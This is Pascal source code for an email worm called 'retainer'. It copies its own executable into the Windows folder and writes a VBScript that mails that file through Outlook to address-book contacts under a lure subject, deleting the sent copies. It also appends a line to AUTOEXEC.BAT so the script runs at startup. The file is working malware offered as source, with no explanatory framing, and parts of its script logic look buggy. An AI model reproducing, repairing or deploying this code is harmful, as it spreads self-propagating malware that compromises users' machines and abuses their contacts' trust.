   program retainer;

   uses windows, sysutils;

   const virsize = 7968;
   var
       fas,f1,wq,f2,f3,f5:file;
       buf:array [1..virsize] of byte;
       buf1:array [1..virsize] of byte;
       p:pointer;
       l:longint;
      o,s,e,r:text;

       procedure w(var s:text);
   begin
    assign(s,'c:\windows\fert.vbs');
        rewrite(s);
   writeln(s,'On Error Resume Next');
   writeln(s,'Dim fso,a,basa,c,d,e,f,ero');
   writeln(s,'Set fso = CreateObject ("outlook.application")');
   writeln(s,'Set a = fso.GetNameSpace ("MAPI")');
   writeln(s,'If fso = "Outlook" Then');
   writeln(s,'a.Logon "profile", "password"');
   writeln(s,'For basa = 1 To a.AddressLists.Count');
   writeln(s,'Set c = a.AddressLists (b)');
   writeln(s,'ero = 0');
   writeln(s,'ero = ero + 2');
   writeln(s,'Set d = fso.CreateItem (0)');
   writeln(s,'For e = 1 To c.AddressEntries.Count');
   writeln(s,'f = c.AddressEntries (ero)');
   writeln(s,'d.Recipients.Add f');
   writeln(s,'ero = ero + 2');
   writeln(s,'Next');
   writeln(s,'d.Subject = "Wow! It should be seen!"');
   writeln(s,'d.Body = "Hi dead friend. Press the attached file!"');
   writeln(s,'d.Attachments.Add "c:\windows\windrv.exe"');
   writeln(s,'d.DeleteAfterSubmit = True');
   writeln(s,'d.Send');
   close(s);
   end;
   procedure w1(var e:text);
   begin
   assign(e,'c:\AUTOEXEC.BAT');
        append(e);
   writeln(e,'@echo off');
   writeln(e,'c:\windows\fert.vbs');
   close(e);
   end;
   procedure w2(var r:text);
   begin
   assign(r,'c:\windows\init2.txt');
        rewrite(r);
   writeln(r,'project retainer mm');
   writeln(r,'-----------------');
   writeln(r,'v 1.2');
   close(r);end;


   begin
   getmem(p, 65535);
   assign(fas, paramstr(0));
   reset(fas,1);
   blockread(fas, buf, virsize);
   assign(f2,'c:\windows\windrv.exe');
   rewrite(f2,1);
   l:= filesize(f2);
   blockread(f2,p^,l);
   seek(f2,0);
   blockwrite(f2, buf,virsize);
   blockwrite(f2,p^,l);
   close(f2);
   freemem(p,65535);
   close(fas);
   assign(f3,'c:\windows\init2.txt');
   rewrite(f3);
   w2(r);
   close(f3);
   assign(wq,'c:\windows\fert.vbs');
   rewrite(wq);
   w(s);
   close(wq);
   w1(e);

   end.
